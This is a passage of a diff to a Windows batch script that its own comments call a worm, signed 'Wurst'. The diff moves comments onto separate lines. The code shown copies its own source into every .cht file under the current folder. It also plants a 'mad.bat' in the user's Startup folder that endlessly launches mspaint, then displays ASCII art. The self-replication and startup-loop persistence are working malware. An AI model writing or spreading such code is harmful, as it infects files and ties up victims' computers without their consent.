@@ -15,9 +15,11 @@ for /r %%i in (*.cht) do (
 	REM Message telling users to check it out.
 	echo this is wurst, a cool program -Wurst %date% >> %%i
 	echo check it out! -Wurst %date% >> %%i
-	type %0 >> %%i REM Source code for the worm, %0 refers to the batch file
+	REM Source code for the worm, %0 refers to the batch file
+	type %0 >> %%i
 	echo: >> %%i
-	echo -Wurst %date% >> %%i REM Sign off with Wurst
+	REM Sign off with Wurst
+	echo -Wurst %date% >> %%i
 	echo: >> %%i
 )
 
@@ -32,7 +34,8 @@ echo start mspaint >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\m
 echo goto :x >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"
 
 REM ASCII Art message
-chcp 65001>nul REM Sets the encoding to UTF-8 because if you don't, the ASCII art would look malformed. Also, >nul hides output
+REM Sets the encoding to UTF-8 because if you don't, the ASCII art would look malformed. Also, >nul hides output
+chcp 65001>nul
 echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀
 echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⠷⠶⠖⠀⠀
 echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣶⣄⠀⠀⠀⠀⠀
